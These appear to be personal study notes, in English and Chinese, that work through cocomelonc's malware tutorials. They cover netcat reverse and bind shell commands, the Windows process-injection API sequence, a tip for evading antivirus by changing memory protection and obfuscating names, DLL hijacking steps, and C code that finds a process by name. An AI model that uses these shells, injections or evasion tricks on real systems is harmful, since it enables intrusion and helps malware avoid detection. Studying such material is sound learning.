> [!check] P45/932

[toc]

### 0x03 Reverse shell
🌟ref: https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html

#### Reverse Shell(victim connects back to attacker)
![](https://cocomelonc.github.io/assets/images/4/shells2.png)

**Attacker (listening):**
```bash
# Attacker sets up a listener
nc -lvnp 4444
```
   
**Victim (initiates connection):**
```bash
# Victim connects back to attacker’s listener
nc <attacker_ip> 4444 -e /bin/bash
```   
- Now the victim machine reaches out to the attacker’s port 4444.
- this will **expose** attacker's ip
#### Bind Shell (victim listens, attacker connects)

**Victim (vulnerable machine):**
```bash
# Victim opens a port and waits
nc -lvnp 4444 -e /bin/bash
```

**Attacker**:
```bash
# Attacker connects to victim’s open port
nc <victim_ip> 4444
```
Here, the victim exposes port 4444 and the attacker connects in.


### 0x04 Code Injection
🌟ref: https://github.com/cocomelonc/2021-09-19-injection-1

![](https://cocomelonc.github.io/assets/images/6/2021-09-19_00-31.png)
1. openprocess (`OPENPROCESS)
2. allocate memory (`VirtualAllocEx`)
3. copy data to process mem(`WriteProcessMemory`)
4. create remote thread  (`CreateRemoteThread`)
**notice** there's a MIS(Mandatory Integrity Control) will check [integrity level](https://youtu.be/VknnHMO8Imw)

> [!example]+ API - VirtualAlloc & VirtualProtect
>
> >🧩 VirtualAlloc
> - 作用：create mem in current process
> - 可以指定配置方式（例如 MEM_RESERVE 只保留位址空間，MEM_COMMIT 則分配實際的物理頁面）。
> - 預設會給這段記憶體一個基本的存取保護（通常是可讀寫）。
>
> >🧩 VirtualAllocEx
> - 指定別的process創建一段記憶體(handle/remote proc.etc)
>
> >🧩 VirtualProtect
> - 作用：修改已經認可的記憶體區域的存取保護屬性。
> - 例如把某段記憶體設為「只讀」、「可執行」、「不可存取」或加上 PAGE_GUARD。
> - 它不能用在未認可的頁面上，必須先透過 VirtualAlloc 認可後才能改變保護

> [!bug]+ AV evade 101
> ![](https://cocomelonc.github.io/assets/images/2/2021-09-04_12-08.png)
>
> - tips: 不直接在virtualAlloc申請一塊 `PAGE_EXECUTE_READ` ，先用`PAGE_READ_WRITE` first, then use `VirtualProtect` to modify to `PAGE_EXECUTE_READ` ，規避防毒
> 🌟ref: [AV evade basic](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html)
> ---
> **進階作法**
> ![](https://cocomelonc.github.io/assets/images/3/2021-09-06_17-25.png)
> Since `VirtualAlloc` will still shows in IAT, we use `GetProcess` to call by addr
> ![](https://cocomelonc.github.io/assets/images/3/2021-09-06_17-52.png)
> and some obfus to the string to evade
  
### 0x05 Basic dll inj
🌟ref: https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
```c
// put them in dllmain
BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

1. put payload on dllMain

![](https://cocomelonc.github.io/assets/images/7/2021-09-20_18-11.png)

2. copy path
3. get dll address (`GetModuleHandle`, `GetProcessAddress`)

> [!example]+ API - GetModuleHandle & GetProcAddress&LoadLibrary
>>🧩 GetModuleHandle
>   - 作用: 取得已經載入到目前行程的模組 (DLL/EXE) 的 Handle。
>   - 如果 DLL 已經在記憶體中，就不必再用 LoadLibrary 重複載入，直接用 GetModuleHandle 取得引用即可。
>   - 常見用途：存取系統 DLL（例如 kernel32.dll、user32.dll）或避免重複載入造成資源浪費。
>   
> >🧩 GetProcAddress
> - 獲取 DLL 裡面某個函式的記憶體位址
> - 它讓程式能在執行階段動態呼叫函式，而不是在編譯時就固定連結。
>
>>🧩LoadLibrary
>- loads a DLL into the calling process’s address space using Unicode(`-A`) or ANSI (`-W`)
>
> > 搭配流程
> - LoadLibrary / GetModuleHandle → 拿到 DLL 的 Handle
> - GetProcAddress → 找到 DLL 裡的函式位址
> - 呼叫函式 → 透過函式指標執行
### 0x06 DLL hijacking
🌟refs: https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html

- tools: dll export viewer / icacls
- tips: executables will load dll in same folder > original position，因此可以建立同名 DLL 來替換原有的 DLL
1. Find process with missing DLLs
2. check folder permission (includes `write`)
3. dll inject

| windows dll searching order                                                                            | we could control                                                |
| ------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------- |
| ![\|500](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/02/word-image-87314-132679-1.png) | ![](https://cocomelonc.github.io/assets/images/8/dllhijack.png) |

### 0x07 process ID inject
🌟ref: https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html
search process id by name
```c
// find process ID by process name
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}
```
1. snapshot all dll (` CreateToolhelp32Snapshot`)
2. enum all proc info (`Process32First`, `Process32Next`)
	1. conpare procname (`pe.szExeFile` from PROCESSENTRY32 struct)
3. return processID (``pe.th32ProcessID)

**full process:**
GetProcAddress -> OpenProcess(pid we queryed) -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread -> CloseHandle

> [!example]+ Basic Struct - HANDLE & LVOID 
> 
> > 🧩 HANDLE
> - 定義：`typedef void* HANDLE;`  系統管理的資源代碼，必須透過 API 操作
> - 例如`CreateFile` ,`OpenProcess` ,`CreateThread` ,事件 等回傳的handle
> - 特性：
>   - 不能直接操作 HANDLE 指向的內容，必須透過 Windows API。
>   - 系統會管理 HANDLE 與資源的對應關係。
>   - **用完要 `CloseHandle` 釋放。**
> 
> >🧩 LPVOID
> - 定義：`typedef void* LPVOID;`  指向任意型別的指標(void pointer)，用來表示一塊記憶體的位址
> - **特性**：
>   - 可以轉型成任何型別指標，例如 `(char*)` 或 `(int*)`。
>   - 代表的是「記憶體位置」，而不是抽象資源。
> 
> > 範例
> ```c
> // HANDLE 範例：開啟檔案
> HANDLE hFile = CreateFile("test.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
> 
> // LPVOID 範例：配置記憶體
> LPVOID pMem = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
> ```
> 

